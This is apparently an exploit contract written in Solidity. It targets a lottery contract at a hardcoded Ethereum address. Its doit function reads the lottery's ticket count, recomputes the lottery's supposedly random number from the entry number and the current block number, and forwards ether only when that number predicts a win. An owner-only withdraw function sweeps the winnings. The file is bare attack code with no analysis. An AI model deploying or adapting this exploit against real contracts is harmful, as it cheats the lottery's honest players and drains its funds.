1 pragma solidity ^0.4.24;
2 
3 contract TheInterface {
4     function getTotalTickets() constant public returns (uint256);
5 }
6 
7 contract LotZ {
8 
9     address private lotAddr = 0x53c2C4Ee7E625d0E415288d6e4E3F38a1BCB2038;
10     address private owner;
11 
12     constructor() public {
13         owner = msg.sender;
14     }
15 
16     function doit() public payable {
17         TheInterface lot = TheInterface(lotAddr);
18         uint256 entry_number = lot.getTotalTickets() + 1;
19         uint lucky_number = uint(keccak256(abi.encodePacked(entry_number + block.number, uint256(0))));
20         require(lucky_number % 3 == 0);
21         require(lotAddr.call.value(msg.value)());
22     }
23 
24     function() public payable {
25     }
26 
27     function withdraw() public {
28         require(msg.sender == owner);
29         owner.transfer(address(this).balance);
30     }
31 
32 }